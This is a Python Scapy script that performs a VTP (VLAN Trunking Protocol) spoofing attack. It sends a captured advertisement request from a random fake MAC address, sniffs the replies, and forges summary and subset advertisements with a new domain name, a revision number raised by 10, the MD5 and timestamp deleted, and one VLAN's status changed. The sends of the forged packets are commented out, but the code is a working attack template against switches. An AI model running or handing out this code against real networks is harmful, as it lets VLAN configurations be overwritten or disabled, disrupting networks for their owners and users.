from time import sleep
from scapy.all import *
from MACCHANGER import MAC_CH
from scapy.layers.l2 import Ether, SNAP

load_contrib("vtp")
a = rdpcap("adv_req.pcapng")
adv_req = a[5]
fakemac = MAC_CH().Random_MAC_Generator()


"""
VTP have 3 types of Packets:
1. Advertisement Requests : This is requested by client, and server reply with summary and subset advetisements
2. Summary Advertisement : This is send by the server to the clients before subset avertisement. This packets 
                            contains basic informations and how many other packet (subset) is following it
3. Subset Advertisement : This is sent after the summary containing complete information about VLAN.
"""


def Stop_filter_1(stop):
    """
    This Function Will stop Sniffing If the Summary Advertisement Packet is Captured
    :param stop: sniffed packet
    :return:
    """
    if stop[SNAP].code == 0x2003:
        if stop["VTP"].code == 0x01:
            return True
    else:
        return False


def Stop_filter(stop):
    """
    This Function Will stop Sniffing If the Subset Advertisement Packet is Captured
    :param stop: Sniffed Packet
    :return:
    """
    if stop[SNAP].code == 0x2003:
        if stop["VTP"].code == 0x02:
            return True
    else:
        return False



def VTP(adv):
    """
    This Function will send VTP Advertisement Requests Using pcap Advertisement Packets
    :param adv: Advertisement Request Packet
    :return:
    """
    adv[Ether].src = fakemac
    sendp(adv, iface="eth1")
    summary_snif()
    subset_sniff()


def summary_craft(Packet):
    """
    This Function will Send Forged Summary Advertisement Packets To the Network
    :param Packet: Summary Advertisement Packets
    :return:
    """

    # Deleting the Previous Length of the Name
    del Packet["VTP"].domnamelen

    # Changing Domain Name of the VTP Server
    Packet["VTP"].domname = ("Hello").encode()

    # Changing Revision Number
    # print(self.subset["VTP"].rev)
    Packet["VTP"].rev = Packet["VTP"].rev + 10

    # Deleting the Timestamp
    del Packet["VTP"].timestamp

    # Deleting the MD5
    del Packet["VTP"].md5


    # sendp(Packet, iface="eth1", verbose=0)
    print("Summary sent")

    Packet.show()


def subset_craft(Packet):
    """
    This Function will Send Forged Subset Advertisement Packets To the Network
    :param Packet: Subset Advertisement Packets
    :return:
    """
    # Filtering Only VTP Packets
    if Packet[SNAP].code == 0x2003:
        # Filtering VTP Packets with code 0x02 i.e. Subset Advertisements which consists of VLAN Informations
        if Packet["VTP"].code == 0x02:

            # Changign Source MAC Address
            Packet[Ether].src = fakemac

            # Deleting the sequence number
            del Packet["VTP"].seq

            # Deleting the Previous Length of the Name
            del Packet["VTP"].domnamelen

            # Changing Domain Name of the VTP Server
            Packet["VTP"].domname = ("Hello").encode()

            # Changing Revision Number
            # print(self.subset["VTP"].rev)
            Packet["VTP"].rev = Packet["VTP"].rev + 10

            Packet["VTPVlanInfo":3].status= 1

            # sendp(Packet, iface="eth1", verbose=0)
            print("Subset sent")
            Packet.show()


def summary_snif():
    """
    This Function is used to send all the sniffed packets for Filtering of desired VTP packet i.e. summary advertisement
    :return:
    """
    sniff(stop_filter=Stop_filter_1, iface="eth1", filter="ether dst 01:00:0c:cc:cc:cc", prn=summary_craft)

def subset_sniff():
    """
    This Function is used to send all the sniffed packets for Filtering of desired VTP packet i.e. subset advertisement
    :return:
    """
    sniff(stop_filter = Stop_filter ,iface="eth1", filter="ether dst 01:00:0c:cc:cc:cc", prn=subset_craft)



VTP(adv_req)